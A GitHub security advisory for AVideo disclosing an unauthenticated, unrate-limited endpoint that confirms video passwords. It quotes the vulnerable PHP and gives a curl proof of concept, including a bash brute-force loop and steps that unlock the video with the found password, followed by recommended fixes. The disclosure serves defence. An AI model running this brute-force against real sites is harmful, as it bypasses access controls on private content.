# [M] AVideo has an Unauthenticated Video Password Brute-Force Vulnerability via Unrate-Limited Boolean Oracle

## Summary
Severity: Medium
Advisory: GHSA-8prq-2jr2-cm92
CVE: CVE-2026-33763
CWE: CWE-307
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-8prq-2jr2-cm92
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `get_api_video_password_is_correct` API endpoint allows any unauthenticated user to verify whether a given password is correct for any password-protected video. The endpoint returns a boolean `passwordIsCorrect` field with no rate limiting, CAPTCHA, or authentication requirement, enabling efficient offline-speed brute-force attacks against video passwords.

## Details

The vulnerable endpoint is defined at `plugin/API/API.php:1111-1133`:

```php
public function get_api_video_password_is_correct($parameters)
{
    $obj = new stdClass();
    $obj->videos_id = intval($parameters['videos_id']);
    $obj->passwordIsCorrect = true;
    $error = true;
    $msg = '';

    if (!empty($obj->videos_id)) {
        $error = false;
        $video = new Video('', '', $obj->videos_id);
        $password = $video->getVideo_password();
        if (!empty($password)) {
            $obj->passwordIsCorrect = $password == $parameters['video_password'];
        }
    } else {
        $msg = 'Videos id is required';
    }

    return new ApiObject($msg, $error, $obj);
}
```

The `get()` dispatcher at `API.php:191-209` routes GET requests directly to this method without any authentication enforcement:

```php
public function get($parameters) {
    // ... optional user login if credentials provided ...
    $APIName = $parameters['APIName'];
    if (method_exists($this, "get_api_$APIName")) {
        $str = "\$object = \$this->get_api_$APIName(\$parameters);";
        eval($str);
    }
}
```

The application has a `checkRateLimit()` mechanism (line 5737) that is applied to user registration (line 4232) and user deactivation (line 5705), but is **not** applied to this password verification endpoint.

Additionally, video passwords are stored in plaintext (`objects/video.php:523-527`):

```php
public function setVideo_password($video_password) {
    AVideoPlugin::onVideoSetVideo_password($this->id, $this->video_password, $video_password);
    $this->video_password = trim($video_password);
}
```

The comparison at line 1125 uses loose equality (`==`) rather than strict equality (`===`).

## PoC

**Step 1: Identify a password-protected video**

```bash
curl -s "http://localhost/plugin/API/get.json.php?APIName=video&videos_id=1" | jq '.response.rows[0].video_password'
```

A non-empty value (e.g., `"1"`) indicates the video is password-protected.

**Step 2: Test incorrect password (oracle returns false)**

```bash
curl -s "http://localhost/plugin/API/get.json.php?APIName=video_password_is_correct&videos_id=1&video_password=wrongguess"
```

Expected response:
```json
{"response":{"videos_id":1,"passwordIsCorrect":false},"error":false}
```

**Step 3: Brute-force the password**

```bash
for pw in password 123456 secret admin test video1 qwerty; do
  result=$(curl -s "http://localhost/plugin/API/get.json.php?APIName=video_password_is_correct&videos_id=1&video_password=$pw" | jq -r '.response.passwordIsCorrect')
  echo "$pw: $result"
  [ "$result" = "true" ] && echo "FOUND: $pw" && break
done
```

No rate limiting is encountered regardless of request volume.

**Step 4: Unlock the video with the discovered password**

```bash
curl -s "http://localhost/view/video.php?v=1&video_password=DISCOVERED_PASSWORD" -c cookies.txt
```

The password is stored in the session (`CustomizeUser.php:806-807`) granting persistent access.

## Impact

An attacker can brute-force the password of any password-protected video on the platform without authentication. Since video passwords are typically simple shared secrets (not per-user credentials), common password dictionaries are likely to succeed quickly. Successful exploitation bypasses the access control for password-protected content, which may include commercially sensitive, private, or restricted video content. The lack of any rate limiting means an attacker can test thousands of passwords per second.

## Recommended Fix

1. **Add rate limiting** to the endpoint using the existing `checkRateLimit()` mechanism:

```php
public function get_api_video_password_is_correct($parameters)
{
    $this->checkRateLimit('video_password_check', 5, 300); // 5 attempts per 5 minutes per IP

    $obj = new stdClass();
    $obj->videos_id = intval($parameters['videos_id']);
    // ... rest of existing code
}
```

2. **Hash video passwords** using `password_hash()`/`password_verify()` instead of plaintext storage and loose comparison:

```php
// In setVideo_password:
$this->video_password = password_hash(trim($video_password), PASSWORD_DEFAULT);

// In the check endpoint:
$obj->passwordIsCorrect = password_verify($parameters['video_password'], $password);
```

3. **Use strict comparison** (`===`) if plaintext passwords must be retained temporarily during migration.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-8prq-2jr2-cm92
- https://nvd.nist.gov/vuln/detail/CVE-2026-33763
- https://github.com/WWBN/AVideo/commit/01a0614fedcdaee47832c0d913a0fb86d8c28135
- https://github.com/WWBN/AVideo
